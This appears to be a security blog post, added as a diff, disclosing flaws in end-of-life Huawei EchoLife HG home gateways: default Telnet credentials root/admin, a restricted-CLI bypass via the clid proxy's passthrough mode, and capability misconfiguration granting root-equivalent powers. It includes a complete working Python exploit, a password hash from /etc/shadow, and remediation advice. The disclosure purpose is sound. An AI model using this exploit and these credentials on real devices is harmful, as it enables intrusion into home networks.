@@ -1,0 +1,391 @@
+---
+layout: post
+title:  "Exploring HUAWEI EchoLife HGxxxx vulnerabilities"
+date:   2025-10-07 21:42:52 +0000
+categories: vuln
+author: "Random Sec Guy"
+---
+
+# Introduction
+
+This post explores several vulnerabilities affecting multiple HUAWEI EchoLife
+HGxxxx devices, that are now end-of-life (EOL) and no longer supported by
+Huawei. As a result, these issues are unlikely to ever be officially patched.
+
+This blog post tries to **avoid** providing informations that can be used in
+**harmful way**.  Instead, its goal is **educational**: to help users understand the
+nature of the vulnerabilities, assess risk, and take steps to secure their
+equipment. These findings also highlight lessons in embedded device design,
+privilege management, and secure service exposure.
+
+The affected devices exhibit three broad, interconnected problems:
+
+**Telnet interface with default root credentials**: The devices expose a Telnet
+management interface with a default username and password. It is surprisingly hard
+to do anything about this for the average user, since on most devices, the web
+interface does not expose any setting to change the telnet password, or disable
+the service entirely.
+
+**Restricted CLI bypass:** The Telnet interface provides a restricted CLI, offering
+various command like "ping". However, this restriction is bypassable, allowing to
+execute arbitrary shell commands.
+
+**Privilege escalation:** Due to Linux capabilities mismanagement, the device
+permits escalation from the restricted CLI to full root privileges.
+
+
+# Telnet Management Interface and the Restricted CLI
+
+Like many ISP‑supplied home gateways, these Huawei EchoLife devices expose a
+built‑in Telnet management interface. This interface was originally intended
+for ISP technicians, not end‑users, and as a result it uses a **vendor‑defined
+root account**. Although the device prompts users to “change the password,” the
+interface does not allow the user to change the password.
+
+The default credentials are **root/admin**.
+
+When connecting to the device over Telnet, the interaction looks roughly like
+this:
+
+```
+$ nc XXX.XXX.XXX.XXX 23
+
+Welcome Visiting Huawei Home Gateway
+Copyright by Huawei Technologies Co., Ltd.
+
+Login: root
+Password: admin
+*****
+Password is default value, please modify it!
+WAP>
+```
+
+After logging in, the device does not immediately provide a standard Unix
+shell. Instead, it launches a **restricted** command‑line interface (CLI). This
+environment exposes only a limited subset of commands implemented by the
+device’s management framework. Many common Linux commands are either hidden or
+deliberately blocked:
+
+```
+WAP> shell
+shell
+
+BusyBox v1.18.4 (2016-04-06 17:30:16 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+WAP(Dopra Linux) # ls -l /usr/bin/id
+lrwxrwxrwx    1 root     root            12 Apr  6  2016 /usr/bin/id -> /bin/busybox
+
+WAP(Dopra Linux) # id
+id
+ERROR::Command is not existed
+```
+
+This log snippet demonstrates how the restriction layer works:
+
+The BusyBox utility `id` clearly exists on the filesystem.
+
+However, when invoked, the system refuses to run it and reports that the
+command “does not exist.”
+
+This restriction is enforced not by the underlying operating system, but by an
+intermediary command filter designed to limit what the user can do.
+
+In other words, although the device technically includes a full BusyBox
+environment, the Telnet‑exposed shell is intentionally constrained. This is
+presumably meant to prevent operators or customers from accessing low‑level
+system functions.
+
+Unfortunately, as the following section of the blog post will discuss, this
+restriction is implemented in **a brittle way** and does not fully achieve its
+security goals.
+
+
+# Understanding the clid Daemon: A Proxy, Not a Simple Command Launcher
+
+At first glance, the Telnet CLI on these Huawei EchoLife devices appears to behave like a standard command interface: a user types a command, and the CLI manager executes it by launching a new process. This is the common model in many embedded devices—each command is expected to spawn a fresh shell or utility.
+
+However, observations using one of the allowed commands, `top`, suggested a different architecture. Running top twice in succession produced the following process trees:
+
+**First run:**
+
+```
+ 5874  5873 root     R     2345  3.5   0 14.2 top -n 1
+ 5873  5452 root     S     2321  3.9   0  0.0 /bin/sh /usr/bin/wap.top
+ 5452   312 root     S     2712  4.3   0  0.0 /bin/sh --login
+  312     1 root     S     74m158.8   0  0.0 clid
+```
+
+**Second run:**
+
+```
+ 5923  5912 root     R     2345  3.5   0 14.2 top -n 1
+ 5912  5452 root     S     2321  3.9   0  0.0 /bin/sh /usr/bin/wap.top
+ 5452   312 root     S     2712  4.3   0  0.0 /bin/sh --login
+  312     1 root     S     74m158.8   0  0.0 clid
+```
+
+The key observation is the intermediate `/bin/sh --login` process:
+
+The `clid` daemon itself is persistent (expected).
+
+Each `wap.top` and `top` process is freshly spawned (expected).
+
+But the `/bin/sh --login` process has the same PID across both invocations, indicating it is a long-running shell rather than a new shell for each command.
+
+## What This Reveals
+
+This shows that `clid` does not directly spawn each command in isolation. Since the `/bin/sh --login` process is long-lived, `clid` has somehow to **feed** the commands to the persistent shell. The most obvious way to do this is to feed the commands to the shell through its **slave pseudo-tty**.
+
+We make the following hypothesis: `clid` acts as a proxy between the network socket and the pseudo-tty, feeding commands into a persistent BusyBox shell through a pseudo-terminal (pty). Every command typed into the CLI goes through this proxy layer and is interpreted by the long-running shell.
+
+Let us test test this hypothesis and assess the security implications.
+
+# The Stateful Nature of clid: How Interactive Commands Reveal the Proxy’s Behavior
+
+Some commands requires some interactive input:
+```
+WAP(Dopra Linux) # clw
+clw
+Confirm to clean the lastword(yes):no
+no^JCancel to clean the lastword.
+```
+
+Here, the `no` is passed directly to the `clw` stdin without filtering. However, typing `no` in a shell
+prompt result in the input being filtered (crucially, the "Command is not existed" is not a standard
+Busybox response, so it must be sent by `clid`):
+
+```
+WAP(Dopra Linux) # no
+no
+ERROR::Command is not existed
+```
+
+This raises an important question:
+
+> How does the CLI distinguish between “text entered at the shell prompt”
+> and “input intended for an interactive program”?
+
+If `clid` simply sanitized everything the user typed, interactive commands would
+break immediately. Conversely, if it forwarded everything raw, its
+command‑restriction layer would be ineffective. The existence of interactive
+utilities implies that `clid` must dynamically switch its behavior depending on
+what the underlying program is doing.
+
+This suggests that `clid` knows when the underlying shell is running a
+utility that expects input, and temporarily switches into a different mode—one
+that forwards data directly to the pseudo tty.
+
+## Why This Is Significant
+
+To support interactive tools, `clid` clearly must maintain some sort of internal
+state machine:
+
+**Sanitization Mode** — when the shell is sitting at a prompt, waiting for a
+command.  In this mode, clid filters commands, blocks disallowed utilities, and
+prevents access to the full shell.
+
+**Passthrough Mode** — when a command is running and might expect user input.
+Here, clid forwards data directly to the shell’s stdin with little or no
+filtering, so the user can interact with password prompts and similar tools.
+
+This statefulness is not merely a technical curiosity—it's a foundational
+design element. The entire security model assumes that `clid` can reliably
+determine when to sanitize and when to forward input raw. But, as we'll see,
+the boundary between these states **is imperfect**. That imperfection ultimately
+creates a path to **bypass the restricted CLI** and reach the underlying shell.
+
+# How Passthrough Mode Can Expose More of the Shell
+
+Building on the previous discussion of `clid`’s statefulness, the proxy daemon
+temporarily switches from sanitization mode to passthrough mode whenever an
+interactive command is executed. This is necessary to allow commands that read
+from standard input—such as password‑changing utilities—to function correctly.
+
+In other words, `clid` has to stop filtering user input while the command runs,
+then resume filtering once the command exits.
+
+## Abusing Passthrough mode
+
+When any command is launched:
+
+ * `clid` sanitizes the command, and feeds it to the shell through the pseudo-tty.
+ * `clid` switches to Passthrough mode.
+ * During command execution, input from the user is directly fed to the pseudo-tty.
+ * Once the command finishes, `clid` returns to Sanitization mode.
+
+**The flaw:** What happens if the user sends input while a non-interactive
+command is running?  This user input is **not** sanitized (since we are in
+Passthrough mode), but the command does not read its stdin, so the input sits
+in the stdin buffer. When the command returns, the stdin buffer is read by busybox,
+and the user input is **executed as a shell command**.
+
+## Sample exploit
+
+Here is a sample exploit for this vulnerability:
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+import sys
+
+HOST = sys.argv[1]
+PORT = 23
+USERNAME = b"root"
+PASSWORD = b"admin"
+
+def main():
+    # Connect
+    conn = remote(HOST, PORT)
+    conn.recvuntil(b"ogin:")
+    conn.sendline(USERNAME)
+    conn.recvuntil(b"assword:")
+    conn.sendline(PASSWORD)
+    output = conn.recvuntil(b"WAP>", timeout=5)
+
+    # Obtain restricted shell
+    conn.sendline(b"shell")
+    while True:
+        output = conn.recvuntil(b"#", timeout=5)
+        cmd = input("Input command: ")
+        if cmd == "":
+            break
+
+        # Send ping command that will takes approx 1 sec
+        conn.sendline(b"ping -c 2 127.0.0.1")
+
+        # Wait for ping command to be running
+        time.sleep(0.5)
+
+        # Send our command, use markers to be able to extract output easily
+        conn.sendline(b"echo BEGIN ; " + cmd.encode("utf-8") + b" ; echo END")
+
+        # Recover command output
+        conn.recvuntil(b"END", timeout=5)
+        conn.recvuntil(b"END", timeout=5)
+        conn.recvuntil(b"BEGIN\r\n", timeout=5)
+        data = conn.recvuntil(b"END", timeout=5)[:-3]
+        sys.stdout.buffer.write(data)
+
+    print("Bye")
+    conn.sendline(b"exit")
+    conn.sendline(b"quit")
+
+if __name__ == "__main__":
+    main()
+```
+
+Usage:
+
+```
+$ python3 exploit.py 192.168.XXX.XXX
+[+] Opening connection to 192.168.XXX.XXX on port 23: Done
+Input command: uname -a
+Linux EchoLife_WAP 2.6.21.6-hrt1 #2 Wed Apr 2 14:15:26 CST 2016 armv6l GNU/Linux
+```
+
+## Lessons learned
+
+From a pedagogical perspective, this illustrates a general principle in system security:
+
+> Any mechanism that temporarily bypasses input restrictions, even for legitimate
+> reasons, must be carefully designed. State transitions are often subtle, and
+> edge cases can create unexpected opportunities for users to execute commands
+> beyond the intended restrictions.
+
+In these Huawei devices, the combination of a persistent shell and the stateful
+clid proxy means that an attacker—or a curious user—could potentially send
+input during passthrough mode that the CLI does not anticipate. While the
+device includes many built-in restrictions, the architecture itself introduces
+a design-level risk.
+
+
+# Privilege escalation
+
+While the command execution loophole allows us to run commands as a non-root users, there exists a capability mishandling/misconfiguration that gives our user way too much capabilities:
+
+```
+Input command: cat /proc/self/status
+Name:	cat
+State:	R (running)
+[...]
+CapInh:	0000000000000000
+CapPrm:	00000000fffffeff
+CapEff:	00000000fffffeff
+```
+
+The provided capabilities effectively grants powers equivalent to the root user: 
+
+```
+0x00000000fffffeff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap
+```
+
+# Remediation
+
+This section focuses on instructions to secure your own device. **Please perform this only on your own device!**
+
+The password is stored in DES format in /etc/shadow: 
+
+```
+Input command: cat /etc/shadow
+root:aqnaBbVaP.9Zo:14453:0:99999:7:::
+nobody:!:11141:0:99999:7:::
+sshd:*:11880:0:99999:7:-1:-1:0
+Input command: mount
+/dev/root on / type squashfs (ro)
+[...]
+```
+
+The password cannot be changed easily as it is in a read-only squashfs, it
+would require flashing it, which is risky and probably unsafe to do while
+the device is running. The flash devices are found in `/dev/mtd*` but I would
+advise against touching it, since it carries a real risk of bricking your device.
+
+Instead the most practical way is to simply kill the `clid` process,
+effectively disabling the Telnet interface:
+
+```
+Input command: ps 
+  PID USER       VSZ STAT COMMAND
+[...]
+  312 root      103m S    clid
+Input command: kill -9 312
+```
+
+Be aware that `clid` will be restarted if the device reboots, so probably a cron task from your PC would be helpful to peridiocally re-kill it.
+
+# Impact and risks
+
+The impact of this vulnerability greatly depends on where you use the device.
+
+## Residential broadband
+
+If you are in this case, an attacker gaining access on your device could:
+
+ * Sniff/intercept traffic, which could compromise some of your privacy (redirect DNS requests to tracking servers, etc) but will not be catastrophic as long as you use https/SSL
+ * Access the devices in your internal LAN (printers, NAS, home cameras, etc).
+ * Make your device participate in a botnet to perform various nefarious activities (such as DDoS)
+ * Brick your device
+
+## Server hosting
+
+If you host web servers behind your device, this is especially bad because
+https/SSL may not save you. An attacker could abuse your device to enable SSL
+certificate mis-issuance by forging ACME HTTP-01 challenge response to get
+Let's Encrypt (for example) to issue them a certificate for your hostname, and
+setup an undetectable MitM attack.
+
+Mitigations strategies include: 
+
+ * Using restrictive DNS CAA records to limit who can issue certificates for your site.
+ * Using DNS challenge instead of HTTP.
+ * Using DNSSEC to protect the above-mentioned DNS mechanism.
+ * Monitoring CT (Certificate Transparency) logs to detect mis-issuance early and take appropriate action.
+
+# The key takeaway for end users
+
+ * The Telnet CLI and its proxy daemon were not designed to provide strong security for untrusted networks.
+ * Devices exposed to public networks—or even poorly segmented home networks—may be at risk due to the way the CLI handles input.
+ * It is surprisingly hard to fix in a good way
+ * Huawei doesn't care
+
